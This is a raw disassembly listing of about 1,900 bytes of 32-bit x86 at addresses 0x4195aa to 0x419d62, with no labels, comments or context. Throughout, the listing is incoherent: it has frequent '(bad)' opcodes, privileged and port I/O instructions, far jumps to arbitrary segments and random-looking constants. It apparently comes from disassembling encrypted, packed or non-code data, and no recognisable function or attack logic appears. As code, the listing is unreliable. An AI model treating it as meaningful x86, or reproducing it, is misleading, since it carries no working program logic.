  4195aa:	mov    ebp,0x463cfaa4
  4195af:	cs mov ebx,0x7c93c5ef
  4195b5:	xor    dh,BYTE PTR [esi]
  4195b7:	ins    BYTE PTR es:[edi],dx
  4195b8:	or     al,0x62
  4195ba:	jo     0x4195bc
  4195bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195bd:	clc    
  4195be:	inc    ebx
  4195bf:	dec    esi
  4195c0:	push   0xe1d40ca7
  4195c5:	cmp    al,0xed
  4195c7:	xlat   BYTE PTR ds:[ebx]
  4195c8:	lods   eax,DWORD PTR ds:[esi]
  4195c9:	repnz push esi
  4195cb:	mov    ds:0xa77c0216,al
  4195d0:	adc    cl,BYTE PTR [ebx]
  4195d2:	sub    BYTE PTR [edi+ebp*4],ah
  4195d5:	xor    BYTE PTR [ecx+0x1d],dh
  4195d8:	jl     0x41955d
  4195da:	cli    
  4195db:	xor    dl,ah
  4195dd:	cwde   
  4195de:	sub    al,0xe0
  4195e0:	lahf   
  4195e1:	sbb    DWORD PTR [ebp-0x49],ebp
  4195e4:	xchg   ebp,eax
  4195e5:	adc    dl,bl
  4195e7:	xlat   BYTE PTR ds:[ebx]
  4195e8:	into   
  4195e9:	mov    eax,0x90d5868e
  4195ee:	xchg   edx,eax
  4195ef:	stc    
  4195f0:	mov    ds:0x4adc7c4b,al
  4195f5:	cmp    dh,BYTE PTR [esp+ebx*8-0x55]
  4195f9:	fimul  DWORD PTR [eax-0x58dcb768]
  4195ff:	pushf  
  419600:	cmc    
  419601:	dec    esi
  419602:	inc    eax
  419603:	cwde   
  419604:	mov    cl,0x49
  419606:	sbb    bh,BYTE PTR [esi-0x63]
  419609:	pop    di
  41960b:	cdq    
  41960c:	cs pop esp
  41960e:	pop    ebx
  41960f:	call   0x3ad3a2c2
  419614:	popa   
  419615:	call   0x7533:0xf259d7e5
  41961c:	and    eax,DWORD PTR [edi]
  41961e:	jne    0x4195a8
  419620:	mov    dh,0xbd
  419622:	pushf  
  419623:	ss icebp 
  419625:	daa    
  419626:	lahf   
  419627:	mov    gs,ebx
  419629:	or     edx,DWORD PTR [ebx+edi*8+0x39fed99c]
  419630:	dec    edx
  419631:	inc    ebp
  419632:	inc    edx
  419633:	add    BYTE PTR [edx+0x29],cl
  419636:	mov    WORD PTR [eax-0x22],cs
  419639:	hlt    
  41963a:	test   BYTE PTR [ebx],bl
  41963c:	int    0xb1
  41963e:	ret    
  41963f:	add    bl,BYTE PTR [eax]
  419641:	addr16 jl 0x419641
  419644:	(bad)  
  419645:	fdivr  DWORD PTR [eax]
  419647:	or     al,0x10
  419649:	outs   dx,DWORD PTR ds:[esi]
  41964a:	adc    BYTE PTR [edi-0x6b],0x93
  41964e:	mov    ah,0x67
  419650:	enter  0x3abb,0xc7
  419654:	mov    dl,dh
  419656:	push   es
  419657:	add    eax,0x10bb5ef7
  41965c:	dec    edi
  41965d:	inc    ebp
  41965e:	push   0x65d592ed
  419663:	push   esp
  419664:	rcl    BYTE PTR [edx+0x69511ca8],cl
  41966a:	jo     0x419695
  41966c:	xchg   ecx,eax
  41966d:	adc    bl,dl
  41966f:	cli    
  419670:	jg     0x41965c
  419672:	(bad)  
  419673:	push   edi
  419674:	cmp    BYTE PTR [ebx+0x2d],dl
  419677:	in     al,0xd5
  419679:	pop    ecx
  41967a:	dec    esp
  41967b:	aam    0x4d
  41967d:	std    
  41967e:	int    0xfa
  419680:	sub    bl,BYTE PTR [ebp+ecx*8-0x43]
  419684:	sub    DWORD PTR [ebp-0x5f3bea5b],0x1c32e7be
  41968e:	pop    ebx
  41968f:	push   edi
  419690:	jge    0x419663
  419692:	cld    
  419693:	push   esi
  419694:	imul   ecx,DWORD PTR [bx+di],0xffffffe6
  419698:	pop    esp
  419699:	ja     0x41970e
  41969b:	bound  edx,QWORD PTR [esp+eiz*4-0x12b1b089]
  4196a2:	sub    eax,0xc841f414
  4196a7:	ret    0x41c
  4196aa:	ficom  DWORD PTR [esi+0x7776415]
  4196b0:	mov    al,0x3e
  4196b2:	std    
  4196b3:	test   eax,0xf280a944
  4196b8:	arpl   WORD PTR [edx],di
  4196ba:	inc    esp
  4196bb:	mov    al,BYTE PTR [edx-0x7d1954e1]
  4196c1:	jbe    0x4196b5
  4196c3:	cmp    bl,BYTE PTR [edi+0x3b]
  4196c6:	cmp    edi,DWORD PTR [ebp-0x25]
  4196c9:	fldenv [esi]
  4196cb:	outs   dx,BYTE PTR ds:[esi]
  4196cc:	jmp    0x4196ee
  4196ce:	das    
  4196cf:	je     0x419746
  4196d1:	mov    ah,0x98
  4196d3:	push   edi
  4196d4:	es jno 0x41965b
  4196d7:	ds pop es
  4196d9:	adc    eax,0xf30b9822
  4196de:	mov    esp,DWORD PTR [ebx+eax*1-0x44]
  4196e2:	inc    esi
  4196e3:	jg     0x41971c
  4196e5:	and    DWORD PTR [esi+0x42],0x2be1701b
  4196ec:	imul   edx,DWORD PTR [eax],0x17324064
  4196f2:	clc    
  4196f3:	inc    esp
  4196f4:	cdq    
  4196f5:	aaa    
  4196f6:	ret    
  4196f7:	add    eax,0x41e35265
  4196fc:	ins    DWORD PTR es:[edi],dx
  4196fd:	div    BYTE PTR [ebx]
  4196ff:	mov    bh,0x84
  419701:	jmp    0x3daa462e
  419706:	push   0x231dc1f2
  41970b:	mov    dh,BYTE PTR [edx]
  41970d:	push   ds
  41970e:	inc    ebp
  41970f:	xchg   ebx,eax
  419710:	hlt    
  419711:	or     cl,dl
  419713:	mov    ebx,0xbd4cf1b0
  419718:	xor    ch,dh
  41971a:	xor    cl,al
  41971c:	push   ds
  41971d:	or     ah,BYTE PTR [esi-0x4de477a8]
  419723:	sub    esp,DWORD PTR [ecx+ecx*8+0x6]
  419727:	mov    ah,ah
  419729:	xor    al,0xd2
  41972b:	mov    ebx,0x5aeb68c6
  419730:	pop    ebp
  419731:	lea    edx,[esi-0x68]
  419734:	and    esp,DWORD PTR [ebp+0x46]
  419737:	lock retw 0x52cd
  41973c:	sti    
  41973d:	xchg   ebx,eax
  41973e:	inc    ebp
  41973f:	dec    eax
  419740:	xchg   esp,eax
  419741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419742:	xor    al,0x26
  419744:	xor    DWORD PTR [eax+0x73],esp
  419747:	daa    
  419748:	dec    ebp
  419749:	adc    BYTE PTR [edx],dl
  41974b:	test   eax,0x3dee2435
  419750:	fcom   DWORD PTR ds:0xa57dca1e
  419756:	dec    ebx
  419757:	dec    ebp
  419758:	pop    esi
  419759:	aam    0x24
  41975b:	ins    DWORD PTR es:[edi],dx
  41975c:	jmp    0xe38997b1
  419761:	in     eax,0x19
  419763:	mov    eax,0xf1eb319d
  419768:	lea    esp,[ecx-0x10c88229]
  41976e:	aas    
  41976f:	cdq    
  419770:	xor    al,0x78
  419772:	pop    ebp
  419773:	pop    es
  419774:	repz lea ecx,[ecx-0x36]
  419778:	add    ebx,eax
  41977a:	pop    esi
  41977b:	int    0xa4
  41977d:	loopne 0x419797
  41977f:	ret    0x8720
  419782:	daa    
  419783:	add    DWORD PTR ds:0xfd593a1,0x563e251
  41978d:	jmp    0x82a8d717
  419792:	mov    edi,0xc3745d2c
  419797:	sbb    DWORD PTR [edi],0xa7834cbb
  41979d:	popf   
  41979e:	ds and al,0x1a
  4197a1:	add    edi,0x88e658af
  4197a7:	out    0x5e,eax
  4197a9:	bound  esi,QWORD PTR [edx]
  4197ab:	push   edx
  4197ac:	div    BYTE PTR fs:[ecx+0x45]
  4197b0:	mov    al,0xaa
  4197b2:	pop    ecx
  4197b3:	bound  eax,QWORD PTR [esi-0x21]
  4197b6:	(bad)  
  4197b7:	pop    esp
  4197b8:	(bad)  
  4197b9:	jbe    0x4197b3
  4197bb:	xor    BYTE PTR [esi+0x4d6c1bcf],dl
  4197c1:	(bad)  
  4197c2:	push   cs
  4197c3:	das    
  4197c4:	push   edx
  4197c5:	add    BYTE PTR [ebp+0x27139f7e],dh
  4197cb:	sahf   
  4197cc:	push   ss
  4197cd:	(bad)  
  4197ce:	repz jl 0x419829
  4197d1:	lods   eax,DWORD PTR ds:[esi]
  4197d2:	fild   WORD PTR [ebp+0x2f1e4388]
  4197d8:	dec    esp
  4197d9:	mov    ebx,0x7c8941c5
  4197de:	inc    esi
  4197df:	cmp    al,0x4e
  4197e1:	mov    edx,0x33499bf6
  4197e6:	sbb    BYTE PTR [edi-0x771b551b],bh
  4197ec:	pop    esp
  4197ed:	shl    BYTE PTR [edi+0x30f8f91e],cl
  4197f3:	push   esi
  4197f4:	out    0xf,al
  4197f6:	jp     0x4197db
  4197f8:	fisttp QWORD PTR [ecx-0x12]
  4197fb:	fst    QWORD PTR [esi]
  4197fd:	pop    ebp
  4197fe:	ins    BYTE PTR es:[edi],dx
  4197ff:	sub    eax,0xbb3fb7ef
  419804:	inc    edi
  419805:	add    eax,0x7f8f3685
  41980a:	sub    eax,0x4548157f
  41980f:	imul   edx,DWORD PTR [esi-0x16],0x9f1f9ceb
  419816:	jno    0x419837
  419818:	adc    bl,BYTE PTR [ebp+0x21e8b847]
  41981e:	mov    al,ds:0xe51503e2
  419823:	jle    0x4198a2
  419825:	sbb    al,BYTE PTR [eax+0x31]
  419828:	mov    bl,0x65
  41982a:	push   cs
  41982b:	lods   al,BYTE PTR ds:[esi]
  41982c:	ret    
  41982d:	inc    ebx
  41982e:	mov    edx,0x111cf9cc
  419833:	in     eax,dx
  419834:	mov    BYTE PTR [eax+eax*1],dl
  419837:	xor    esp,DWORD PTR [edi]
  419839:	xor    BYTE PTR [eax-0x66],ch
  41983c:	or     ch,BYTE PTR [eax]
  41983e:	lods   ax,WORD PTR ds:[esi]
  419840:	push   ds
  419841:	xor    eax,0xe21609b1
  419846:	push   edi
  419847:	xor    eax,0x8a8cda23
  41984c:	mov    dl,0x2a
  41984e:	or     eax,ecx
  419850:	xchg   ecx,eax
  419851:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419852:	je     0x419853
  419854:	sub    al,0xfc
  419856:	xchg   edx,eax
  419857:	test   DWORD PTR [edi],0xca0ac7a8
  41985d:	mov    cl,0xa0
  41985f:	cmp    BYTE PTR [ebx-0x6626e994],ch
  419865:	out    dx,al
  419866:	mov    ebx,0x9333f958
  41986b:	nop
  41986c:	aaa    
  41986d:	mov    bh,0x1a
  41986f:	mov    ch,0xf6
  419871:	add    al,0xa8
  419873:	sbb    eax,0xb1c2850e
  419878:	jp     0x41988e
  41987a:	ins    BYTE PTR es:[edi],dx
  41987b:	into   
  41987c:	dec    esp
  41987d:	pop    eax
  41987e:	mov    edx,0x2f2ac5aa
  419883:	int    0xea
  419885:	popf   
  419886:	icebp  
  419887:	pop    edx
  419888:	aam    0x76
  41988a:	iret   
  41988b:	lock lds ecx,FWORD PTR [ebx]
  41988e:	jbe    0x419866
  419890:	(bad)  
  419892:	fild   QWORD PTR [bp-0x4f]
  419896:	and    al,0x1b
  419898:	push   ecx
  419899:	sbb    edi,esi
  41989b:	sar    dh,1
  41989d:	xor    DWORD PTR [eax-0x2f],0x51a359d0
  4198a4:	je     0x4198af
  4198a6:	(bad)  
  4198a7:	xchg   ecx,eax
  4198a8:	lea    esp,[edx-0x34ea815c]
  4198ae:	mov    dh,0x90
  4198b0:	cwde   
  4198b1:	dec    ecx
  4198b2:	cmp    BYTE PTR [edx],bh
  4198b4:	(bad)  
  4198b5:	(bad)  
  4198b6:	(bad)  
  4198b7:	or     DWORD PTR [esi],ebx
  4198b9:	jb     0x41991e
  4198bb:	std    
  4198bc:	cdq    
  4198bd:	xor    al,bh
  4198bf:	adc    ch,ch
  4198c1:	adc    ecx,DWORD PTR [ebp-0x23]
  4198c4:	scas   eax,DWORD PTR es:[edi]
  4198c5:	mov    ecx,eax
  4198c7:	stos   BYTE PTR es:[edi],al
  4198c8:	inc    ebx
  4198c9:	cld    
  4198ca:	fisubr DWORD PTR [esi]
  4198cc:	imul   esi,DWORD PTR [ecx+0x61468498],0x56dbe7fd
  4198d6:	outs   dx,BYTE PTR ds:[esi]
  4198d7:	fwait
  4198d8:	xor    BYTE PTR ds:0xfc26cde9,0xac
  4198df:	cmp    al,BYTE PTR [eax-0x2d]
  4198e2:	fucom  st(5)
  4198e4:	cmp    BYTE PTR [esi],cl
  4198e6:	cmp    BYTE PTR [edx],ch
  4198e8:	shl    esp,cl
  4198ea:	and    DWORD PTR [ebp+0x64069676],ebx
  4198f0:	pop    ebx
  4198f1:	cwde   
  4198f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4198f3:	push   eax
  4198f4:	gs mov dh,0x7a
  4198f7:	stos   DWORD PTR es:[edi],eax
  4198f8:	aam    0xde
  4198fa:	and    DWORD PTR [edi-0x21],esp
  4198fd:	test   al,0xdb
  4198ff:	fiadd  WORD PTR [edi-0x6f]
  419902:	push   esi
  419903:	loop   0x41992b
  419905:	inc    ebp
  419906:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419907:	ficom  WORD PTR [edx+0x74]
  41990a:	mov    esp,0x83888f60
  41990f:	xor    eax,0x1eeb5174
  419914:	sbb    ebx,DWORD PTR [ecx-0x6e]
  419917:	call   0x4e4a:0xc787daf
  41991e:	mov    edi,0x5ba8d97b
  419923:	xchg   ebp,eax
  419924:	pop    ss
  419925:	(bad)
  419928:	loope  0x4198b8
  41992a:	loope  0x41997e
  41992c:	pop    edx
  41992d:	neg    edx
  41992f:	imul   edx,DWORD PTR [edi-0x3453e5be],0xffffffae
  419936:	push   0x64
  419938:	jae    0x41990f
  41993a:	or     eax,0xec2276ce
  41993f:	mov    bh,0x81
  419941:	out    dx,eax
  419942:	loope  0x419906
  419944:	rcl    BYTE PTR [ecx],cl
  419946:	clc    
  419947:	or     BYTE PTR [eax],bl
  419949:	cmp    al,0x1b
  41994b:	xor    eax,DWORD PTR [edi-0x2b1fdd6e]
  419951:	sar    DWORD PTR [edx-0x222c56bc],cl
  419957:	ret    0x177b
  41995a:	adc    eax,0x4f03b975
  41995f:	mov    ebp,0x7e51071f
  419964:	out    0x93,al
  419966:	lods   al,BYTE PTR ds:[esi]
  419967:	inc    ebp
  419968:	fistp  WORD PTR [edx]
  41996a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41996b:	mov    ds:0x94bd5ef4,eax
  419970:	or     BYTE PTR [ebx+0x59],0xc4
  419974:	add    eax,DWORD PTR [ebx]
  419976:	mov    ds:0x2c315b16,al
  41997b:	add    eax,0x3f9f6c6b
  419980:	and    bh,dl
  419982:	imul   edx,DWORD PTR [edi-0x2d],0x23
  419986:	adc    BYTE PTR [eax],cl
  419988:	jp     0x41995e
  41998a:	cmp    eax,0x16ce7d53
  41998f:	sbb    bl,cl
  419991:	test   DWORD PTR [ebx+0x7ce8b922],eax
  419997:	sbb    eax,0x924d1f34
  41999c:	sub    DWORD PTR [eax],esi
  41999e:	dec    edi
  41999f:	jns    0x4199a1
  4199a1:	aas    
  4199a2:	js     0x41993c
  4199a4:	mov    ebp,0x52aa8135
  4199a9:	in     al,0xa2
  4199ab:	jb     0x4199c9
  4199ad:	cdq    
  4199ae:	dec    esp
  4199af:	mov    dh,0xe6
  4199b1:	xchg   esi,eax
  4199b2:	test   DWORD PTR [eax],esp
  4199b4:	rol    esi,cl
  4199b6:	outs   dx,BYTE PTR ds:[esi]
  4199b7:	cmp    eax,0xd4634226
  4199bd:	jae    0x4199db
  4199bf:	js     0x4199aa
  4199c1:	mov    dl,0x9b
  4199c3:	lea    edi,[esi-0x3c]
  4199c6:	jbe    0x4199c0
  4199c8:	push   0x80088508
  4199cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199ce:	aad    0x50
  4199d0:	add    eax,0x3dc184ba
  4199d5:	mov    cl,0x61
  4199d7:	mov    ch,0x6e
  4199d9:	mov    ds,WORD PTR [ecx]
  4199db:	ins    DWORD PTR es:[edi],dx
  4199dc:	sub    edi,edx
  4199de:	aas    
  4199df:	fisub  DWORD PTR [edx-0x4a]
  4199e2:	test   BYTE PTR [edi],ch
  4199e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199e5:	mov    ebx,DWORD PTR [ebx+0x1fc99b42]
  4199eb:	adc    al,0x30
  4199ed:	cmp    esp,eax
  4199ef:	das    
  4199f0:	push   ecx
  4199f1:	dec    esi
  4199f2:	mov    edx,0xa4beacc3
  4199f7:	inc    edi
  4199f8:	sbb    eax,0x8d887960
  4199fd:	mov    ebx,DWORD PTR [ecx]
  4199ff:	aam    0x51
  419a01:	dec    esp
  419a02:	(bad)  
  419a03:	fcom   st(6)
  419a05:	arpl   WORD PTR [ecx+0x6d9465be],cx
  419a0b:	ja     0x419a20
  419a0d:	sub    dh,cl
  419a0f:	sub    edi,DWORD PTR [edx+0x7d81ecf]
  419a15:	mov    dl,0x75
  419a17:	mov    WORD PTR [ebx+0x4c],?
  419a1a:	in     al,dx
  419a1b:	adc    BYTE PTR [eax+0x67],dl
  419a1e:	mov    cl,bh
  419a20:	in     al,0xfb
  419a22:	cmp    eax,0xa5922d6f
  419a27:	arpl   WORD PTR [ebx-0x1b6260bd],bx
  419a2d:	push   edx
  419a2e:	lods   eax,DWORD PTR ds:[esi]
  419a2f:	ins    BYTE PTR es:[edi],dx
  419a30:	data16 mov al,ds:0x6e1a5fb4
  419a36:	jg     0x4199cf
  419a38:	push   esi
  419a39:	adc    BYTE PTR [edi],bl
  419a3b:	lds    eax,FWORD PTR [ebx+0x57b62da]
  419a41:	jo     0x419a86
  419a43:	add    BYTE PTR [eax+ebx*2],dl
  419a46:	rcr    BYTE PTR [edx+0x1a],0x21
  419a4a:	retf   0x892c
  419a4d:	sub    DWORD PTR [eax-0x72],ebx
  419a50:	sahf   
  419a51:	rcl    cl,0xdd
  419a54:	loope  0x4199ee
  419a56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419a57:	adc    DWORD PTR [eax-0x46637259],0x29
  419a5e:	pop    ds
  419a5f:	call   0x405db37c
  419a64:	mov    ds:0x77ef0884,al
  419a69:	int3   
  419a6a:	fs push esp
  419a6c:	pop    edi
  419a6d:	test   edi,edi
  419a6f:	fidiv  WORD PTR [eax+0xa4b1c7f]
  419a75:	dec    edi
  419a76:	fst    QWORD PTR ss:[eax]
  419a79:	stos   DWORD PTR es:[edi],eax
  419a7a:	adc    ebp,DWORD PTR [ecx+0x185d6dec]
  419a80:	addr16 sahf 
  419a82:	sbb    DWORD PTR [ecx+0x1ac4787b],edi
  419a88:	gs adc edx,esp
  419a8b:	(bad)
  419a8e:	int    0x4c
  419a90:	xor    ebp,ebp
  419a92:	sub    ch,BYTE PTR [edx]
  419a94:	data16 add bh,BYTE PTR [ecx+edx*2+0x32]
  419a99:	and    bl,BYTE PTR [esi-0x6ae9b6a]
  419a9f:	fprem  
  419aa1:	mov    cl,0x98
  419aa3:	sub    ecx,DWORD PTR [esp+esi*1+0x4]
  419aa7:	cmp    BYTE PTR [edx-0x1c],ch
  419aaa:	xor    ah,bh
  419aac:	call   0x2a37:0x46d6290a
  419ab3:	aaa    
  419ab4:	xlat   BYTE PTR ds:[ebx]
  419ab5:	mov    WORD PTR [ebx],cs
  419ab7:	push   esi
  419ab8:	sbb    bh,al
  419aba:	sub    dl,ah
  419abc:	cmp    eax,0x2bd52b7b
  419ac1:	sub    dl,BYTE PTR [ebp+0x77f86f43]
  419ac7:	scas   al,BYTE PTR es:[edi]
  419ac8:	outs   dx,DWORD PTR ds:[esi]
  419ac9:	imul   edx,DWORD PTR [edi+edi*4-0x35],0x79
  419ace:	pusha  
  419acf:	dec    esp
  419ad0:	sbb    cl,bh
  419ad2:	xchg   BYTE PTR [esp+edi*4],cl
  419ad5:	(bad)  
  419ad7:	pop    ebx
  419ad8:	cmp    edx,DWORD PTR [esp+ebp*8-0x5b27acbf]
  419adf:	add    DWORD PTR [eax-0x4dcc05d0],0x64
  419ae6:	xor    BYTE PTR [ebx],0xfa
  419ae9:	mov    WORD PTR [eax],ds
  419aeb:	push   ss
  419aec:	mov    ds:0x88501b9e,al
  419af1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419af2:	neg    DWORD PTR [edi+0x3]
  419af5:	mov    bh,ah
  419af7:	adc    al,0x74
  419af9:	and    ebp,esp
  419afb:	ss mov ebp,0xa68b943
  419b01:	scas   eax,DWORD PTR es:[edi]
  419b02:	xlat   BYTE PTR ds:[ebx]
  419b03:	test   DWORD PTR [edx],esp
  419b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b06:	ins    DWORD PTR es:[edi],dx
  419b07:	cdq    
  419b08:	inc    esi
  419b09:	or     bh,BYTE PTR [eiz*8+0x46fae8be]
  419b10:	sbb    al,0x6c
  419b12:	bound  esi,QWORD PTR [ebp-0x63]
  419b15:	gs repz mov edx,0xa6788ce7
  419b1c:	mov    ?,WORD PTR [ebp-0x71]
  419b1f:	mov    cl,0x5d
  419b21:	jle    0x419b0d
  419b23:	push   eax
  419b24:	cdq    
  419b25:	add    esp,DWORD PTR [ecx-0x4f496af2]
  419b2b:	jecxz  0x419ab0
  419b2d:	fmul   QWORD PTR [eax+0x4487fd59]
  419b33:	add    DWORD PTR [edx+0x2fa8d061],ebp
  419b39:	mov    esi,0xa5fc092a
  419b3f:	xor    BYTE PTR [ebp+0x2e],0x26
  419b43:	mov    ss,WORD PTR [esi+0x5c]
  419b46:	icebp  
  419b47:	lods   al,BYTE PTR ds:[esi]
  419b48:	je     0x419b1d
  419b4a:	inc    esi
  419b4b:	cmp    edx,eax
  419b4d:	retf   
  419b4e:	lahf   
  419b4f:	call   0xfc2e7583
  419b54:	in     eax,0xcf
  419b56:	sahf   
  419b57:	hlt    
  419b58:	and    BYTE PTR [ecx-0x11a73292],0x6b
  419b5f:	(bad)  
  419b60:	pop    esp
  419b61:	fwait
  419b62:	arpl   WORD PTR [ebx],cx
  419b64:	xchg   DWORD PTR [esi],ebp
  419b66:	mov    al,ds:0xd7b11167
  419b6b:	jae    0x419afd
  419b6d:	(bad)  
  419b6e:	fcmovb st,st(3)
  419b70:	pop    eax
  419b71:	add    eax,0x61fd6d45
  419b76:	addr16 jmp 0x6f30:0x570c72e
  419b7e:	mov    bh,0x6c
  419b80:	les    eax,FWORD PTR [ebx-0x2e]
  419b83:	stos   BYTE PTR es:[edi],al
  419b84:	int    0xac
  419b86:	repnz imul ebp,DWORD PTR ds:0x9273fc05,0x14
  419b8e:	dec    ebp
  419b8f:	dec    esi
  419b90:	in     eax,0x92
  419b92:	scas   al,BYTE PTR es:[edi]
  419b93:	mov    ah,0x52
  419b95:	sbb    al,0xfe
  419b97:	mov    ebx,edi
  419b99:	jge    0x419bdd
  419b9b:	fsubr  st,st(5)
  419b9d:	aaa    
  419b9e:	pop    ecx
  419b9f:	xor    ebp,ebp
  419ba1:	jmp    FWORD PTR [edx+0xe6e0e02]
  419ba7:	iret   
  419ba8:	(bad)  
  419ba9:	pop    ss
  419baa:	jns    0x419be0
  419bac:	inc    esi
  419bad:	mov    dh,0xbd
  419baf:	mov    eax,0x129fc508
  419bb4:	mov    edi,0x5b54d60b
  419bb9:	mov    BYTE PTR [eax+0x4f017b41],0x50
  419bc0:	cmc    
  419bc1:	(bad)  [ebx]
  419bc3:	popa   
  419bc4:	addr16 repz jl 0x419b82
  419bc8:	lahf   
  419bc9:	aas    
  419bca:	or     BYTE PTR [ebp*2-0x2e1e347e],bl
  419bd1:	jne    0x419c2b
  419bd3:	sub    al,0x17
  419bd5:	dec    edx
  419bd6:	fwait
  419bd7:	mov    DWORD PTR [ecx+0x6e],edx
  419bda:	and    ah,BYTE PTR [eax+0x26]
  419bdd:	mov    DWORD PTR [ebp+0x5c],esp
  419be0:	lods   eax,DWORD PTR ds:[esi]
  419be1:	repz inc edi
  419be3:	xor    al,0xd6
  419be5:	lods   al,BYTE PTR ds:[esi]
  419be6:	inc    esp
  419be7:	imul   edx,DWORD PTR [edx],0xb4fd159f
  419bed:	inc    esp
  419bee:	scas   eax,DWORD PTR es:[edi]
  419bef:	out    dx,eax
  419bf0:	mov    DWORD PTR ds:0xdf38e48c,edx
  419bf6:	add    BYTE PTR [eax],al
  419bf8:	in     eax,0x41
  419bfa:	jno    0x419bb0
  419bfc:	popf   
  419bfd:	lods   eax,DWORD PTR ds:[esi]
  419bfe:	shl    DWORD PTR [ebx+edx*4],0x7c
  419c02:	xchg   esi,eax
  419c03:	inc    edx
  419c04:	sbb    DWORD PTR [ebp-0x46],ebp
  419c07:	sbb    cl,dh
  419c09:	rcl    bh,1
  419c0b:	mov    ds:0x87875127,al
  419c10:	adc    al,BYTE PTR [edx+ebp*2+0x6c724d6f]
  419c17:	xor    BYTE PTR [esi+0x1d],dl
  419c1a:	sbb    ecx,edi
  419c1c:	inc    edx
  419c1d:	pusha  
  419c1e:	and    al,0x75
  419c20:	jmp    0xdb7e:0x253fb327
  419c27:	push   ebx
  419c28:	xor    al,0x8b
  419c2a:	aad    0x75
  419c2c:	std    
  419c2d:	cmp    al,BYTE PTR [esi+0x72]
  419c30:	jmp    0x419bcd
  419c32:	mov    DWORD PTR [ebp+0x7c],ebp
  419c35:	sub    DWORD PTR [edi+0x720bab74],ebx
  419c3b:	pop    esi
  419c3c:	iret   
  419c3d:	add    BYTE PTR [edx+0x6a],bh
  419c40:	sbb    eax,0x5e9c16de
  419c45:	xlat   BYTE PTR ds:[ebx]
  419c46:	add    edi,DWORD PTR [edi+eiz*1+0x3b]
  419c4a:	xchg   ecx,eax
  419c4b:	xchg   edx,eax
  419c4c:	push   ebp
  419c4d:	and    DWORD PTR [esi],ecx
  419c4f:	in     eax,dx
  419c50:	or     dh,BYTE PTR [ebx]
  419c52:	or     ecx,eax
  419c54:	mov    al,0xa1
  419c56:	push   0x83c60b08
  419c5b:	jno    0x419bee
  419c5d:	dec    ecx
  419c5e:	mov    dh,0x8a
  419c60:	jnp    0x419beb
  419c62:	mov    ds:0x3fb8dffe,eax
  419c67:	(bad)  
  419c68:	cmp    dl,BYTE PTR [eax]
  419c6a:	daa    
  419c6b:	retf   
  419c6c:	sub    ch,BYTE PTR [ecx+eax*1+0x5d]
  419c70:	push   cs
  419c71:	popf   
  419c72:	out    dx,al
  419c73:	dec    edi
  419c74:	cmp    DWORD PTR [ebx],esi
  419c76:	iret   
  419c77:	and    ah,BYTE PTR [ecx-0x33]
  419c7a:	mov    esp,edi
  419c7c:	lahf   
  419c7d:	cwde   
  419c7e:	or     eax,0x5c5ea765
  419c83:	mov    edi,0x1e4ffc70
  419c88:	xchg   esi,eax
  419c89:	sub    al,0x19
  419c8b:	xchg   ebp,eax
  419c8c:	jne    0x419cf5
  419c8e:	cmp    DWORD PTR [eax+0x1],esi
  419c91:	inc    ecx
  419c92:	jg     0x419c7e
  419c94:	repz push 0x29219fd2
  419c9a:	std    
  419c9b:	rcr    ecx,cl
  419c9d:	arpl   di,bx
  419c9f:	pop    edi
  419ca0:	sub    BYTE PTR [ecx+0x1736f2fa],bl
  419ca6:	stc    
  419ca7:	mov    ebp,0xc89e6646
  419cac:	daa    
  419cad:	dec    esp
  419cae:	sub    esi,DWORD PTR [esi+0x4f46055c]
  419cb4:	call   0x43778dc6
  419cb9:	lds    eax,FWORD PTR ds:0x639603c6
  419cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cc0:	and    ecx,DWORD PTR [eax]
  419cc2:	call   0xb90d0c47
  419cc7:	addr16 and al,al
  419cca:	cs or  esi,edi
  419ccd:	pop    esp
  419cce:	sbb    DWORD PTR [eax+0x2b],ebp
  419cd1:	push   esi
  419cd2:	aas    
  419cd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419cd4:	adc    BYTE PTR [esi],al
  419cd6:	(bad)  
  419cd8:	jl     0x419d32
  419cda:	adc    ebp,DWORD PTR [edx+0x7b]
  419cdd:	popa   
  419cde:	push   0x68
  419ce0:	mov    dx,0x3a9a
  419ce4:	rcr    DWORD PTR [edx-0x2415795b],1
  419cea:	xor    eax,0xd5140604
  419cef:	cmp    al,0x66
  419cf1:	adc    BYTE PTR [edi+ecx*8+0x48],0xc5
  419cf6:	cld    
  419cf7:	loope  0x419d6d
  419cf9:	sbb    bl,BYTE PTR [edi-0x7]
  419cfc:	cli    
  419cfd:	stos   DWORD PTR es:[edi],eax
  419cfe:	sub    esi,DWORD PTR [ebx]
  419d00:	les    ebp,FWORD PTR [ecx-0x1f306727]
  419d06:	jne    0x419d02
  419d08:	mov    ecx,0xac2cd206
  419d0d:	add    edi,ebp
  419d0f:	push   ds
  419d10:	or     DWORD PTR [ebx+edx*4],esp
  419d13:	push   ds
  419d14:	push   ecx
  419d15:	les    ecx,FWORD PTR [edi]
  419d17:	push   ebx
  419d18:	ss iret 
  419d1a:	sbb    bh,BYTE PTR [edi-0x7623796d]
  419d20:	push   cs
  419d21:	cwde   
  419d22:	jae    0x419cfe
  419d24:	mov    dl,0x4b
  419d26:	sbb    eax,0x8ad201e0
  419d2b:	push   edi
  419d2c:	arpl   WORD PTR [ebx-0x4a],dx
  419d2f:	sbb    al,dh
  419d31:	inc    edi
  419d32:	adc    al,BYTE PTR [esi-0x196ec96]
  419d38:	cmp    al,ch
  419d3a:	adc    eax,0x1a725240
  419d3f:	leave  
  419d40:	dec    ecx
  419d41:	fdivr  st(7),st
  419d43:	xchg   DWORD PTR [ebx+0x29e222fa],ecx
  419d49:	sbb    al,0x48
  419d4b:	mov    edx,0x7a5f9ed8
  419d50:	mov    DWORD PTR [ebx+eax*1],esp
  419d53:	adc    BYTE PTR ds:0x9cce9a94,dh
  419d59:	xor    eax,0x7ef38a81
  419d5e:	or     DWORD PTR [ecx-0xc],ebx
  419d61:	(bad)  
  419d62:	in     eax,0x69
